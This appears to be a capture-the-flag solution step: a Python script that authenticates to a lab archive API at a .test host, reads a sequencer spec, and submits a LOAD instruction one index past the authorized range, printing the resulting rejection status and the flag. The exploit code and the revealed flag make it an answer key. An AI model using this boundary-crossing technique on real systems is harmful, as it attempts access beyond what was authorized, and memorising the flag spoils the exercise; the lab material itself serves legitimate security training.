Requires W16.1 (get sequencer spec). Submit LOAD program crossing the authorized_indices boundary.

```python
import json, ssl, urllib.request, pathlib, base64, uuid

ctx = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
sess = pathlib.Path("handover/corporate-session").read_text().strip()
h = {"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc", "Content-Type": "application/json"}

d0 = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://retained-archive.arwc.test/api/sequencer-specs/current",
                            headers={"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc"}),
    context=ctx).read())
rec = d0["record"]; seq_id = rec["record_id"]; revision = rec["revision"]
opcodes = rec["opcodes"]; auth = rec["authorized_indices"]

def program(*instructions):
    encoded = bytearray()
    for name, *operands in instructions:
        encoded.append(opcodes[name])
        encoded += bytes((list(operands) + [0, 0, 0])[:3])
    return base64.b64encode(bytes(encoded)).decode()

def binding(**extra):
    return {"sequencer": seq_id, "revision": revision, "request_id": "req-" + uuid.uuid4().hex, **extra}

# Normal observation (slot 0 is authorized)
prog_ok = program(("LOAD", auth[0]), ("HALT",))
d_ok = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://retained-archive.arwc.test/api/observations",
                            data=json.dumps(binding(program=prog_ok)).encode(), headers=h, method="POST"),
    context=ctx).read())
print("Normal status:", d_ok["record"]["status"])  # completed

# Boundary crossing: boundary = max(authorized_indices) + 1 = 32
boundary = max(auth) + 1
prog_cross = program(("LOAD", boundary), ("HALT",))
d_cross = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://retained-archive.arwc.test/api/observations",
                            data=json.dumps(binding(program=prog_cross)).encode(), headers=h, method="POST"),
    context=ctx).read())
print("Crossing status:", d_cross["record"]["status"])  # late-authorization-rejection
print("flag:", d_cross["flag"])                          # FLAG{1a617ba423924104}
```

Flag: `FLAG{1a617ba423924104}` in the top-level `flag` field when boundary is crossed.
